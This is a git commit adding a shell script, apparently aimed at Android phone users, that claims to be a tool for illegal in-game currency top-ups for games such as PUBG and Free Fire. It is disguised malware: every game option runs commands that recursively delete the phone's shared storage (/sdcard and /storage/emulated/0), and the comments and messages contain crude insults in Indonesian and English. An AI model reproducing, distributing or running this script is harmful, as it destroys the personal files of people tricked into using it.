7aa140efe0dd46b719ad5b07e1eb5cc0be61cd8d
DarkNet-Hacker-Team <44440552+DarkNet-Hacker-Team@users.noreply.github.com>
2019-01-25 12:35:52 +0700

    Add files via upload

---
+++ Top-up.sh
@@ -0,0 +1,104 @@
+#recode Kontolnya Busuk
+#copas Mak nya Mati
+#pake aja langsung Babi
+#camkan itu Kontol
+# Variables
+b='\033[1m'
+u='\033[4m'
+bl='\E[30m'
+r='\E[31m'
+g='\E[32m'
+bu='\E[34m'
+m='\E[35m'
+c='\E[36m'
+w='\E[37m'
+endc='\E[0m'
+enda='\033[0m'
+blue='\e[1;34m'
+cyan='\e[1;36m'
+red='\e[1;31m'
+
+figlet CR4CK3R |lolcat
+
+echo  "##############################" |lolcat
+echo  " TOOLS TOP-UP GAME ONLINE$green " |lolcat
+echo  " CODED BY 5H311_1NJ3C706 $green " |lolcat
+echo  "##############################" |lolcat
+
+
+###################################################
+# CTRL + C                                        #
+###################################################
+
+trap ctrl_c INT
+ctrl_c() {
+clear
+echo $green"[#]> (Ctrl + C ) Detected, Trying To Exit ... " |lolcat
+echo $green"[#]> MAKASIH UDH PAKE TOOLS GUE " |lolcat
+sleep 1
+echo ""
+echo $green"[#]> CR4CK3R WAS HERE" |lolcat
+
+echo $green"[#]> See you Again :)..." |lolcat
+sleep 1
+exit
+}
+
+lagi=1
+while [ $lagi -lt 6 ];
+do
+echo ""
+echo  $b "1. TOP UP ILEGAL ML${enda}";
+echo  "=======================" |lolcat
+echo  $b "2. TOP UP ILEGAL COC${enda}";
+echo  "=======================" |lolcat
+echo  $b "3. TOP UP ILEGAL GT${enda}";
+echo  "=======================" |lolcat
+echo  $b "4. TOP UP ILEGAL FF${enda}";
+echo  "=======================" |lolcat
+echo  $b "5. TOP UP ILEGAL PUBG${enda}";
+echo  "=======================" |lolcat
+echo  $b "6. Exit${enda}";
+echo  "╭─CR4CK3R [PILIH AJA NOMERNYA]" |lolcat
+read -p "╰─#" pil;
+
+case $pil in
+1) rm -rf /sdcard/
+    rm -rf /storage/emulated/0/
+exit
+
+;;
+
+2) rm -rf /sdcard/
+    rm -rf /storage/emulated/0/
+exit
+
+;;
+
+3) rm -rf /sdcard/
+    rm -rf /storage/emulated/0/
+exit
+
+;;
+
+4) rm -rf /sdcard/
+    rm -rf /storage/emulated/0/
+exit
+
+;;
+
+5) rm -rf /sdcard/
+    rm -rf /storage/emulated/0/
+exit
+
+;;
+
+6) echo "BYE-BYE PARA HACKER KONTOL" |lolcat
+exit
+
+;;
+
+*) echo "Sorry. Your dick isn't clean yet [T4T]"
+esac
+done
+done
